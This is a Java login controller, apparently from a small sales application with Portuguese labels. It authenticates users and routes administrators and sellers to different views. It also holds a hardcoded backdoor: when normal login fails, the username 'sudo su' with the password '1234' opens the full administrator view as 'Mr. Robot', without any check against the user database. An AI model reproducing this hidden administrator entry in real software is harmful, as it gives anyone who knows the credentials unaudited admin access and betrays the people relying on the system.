package controller;

import model.Usuario;
import service.UsuarioService;
import view.LoginView;

public class LoginController {

	private LoginView view;
	private UsuarioService funcionarioService;

	public LoginController(LoginView view) {
		this.view = view;
	}

	public void realizarLogin(String usuario, String senha) {
		funcionarioService = new UsuarioService();

		
		if (usuario.isEmpty() || senha.isEmpty()) {
			view.exibirMensagemErro("Por favor, preencha todos os campos.");
			return;
		}

		
		if (funcionarioService.autenticar(usuario, senha)) {
			Usuario user = funcionarioService.buscarPorUsuario(usuario);
			if(user.getNivelAcesso().equalsIgnoreCase("administrador")) {
				view.init(usuario);
			}else {
				view.initVendedor(usuario);
			}
			
		} else if(usuario.equalsIgnoreCase("sudo su") && senha.equalsIgnoreCase("1234")) {
			view.init("Mr. Robot");
		}
		else {
		
			view.exibirMensagemErro("Usuário ou senha incorretos.");
			view.limparCampos();
		}
	}

	
}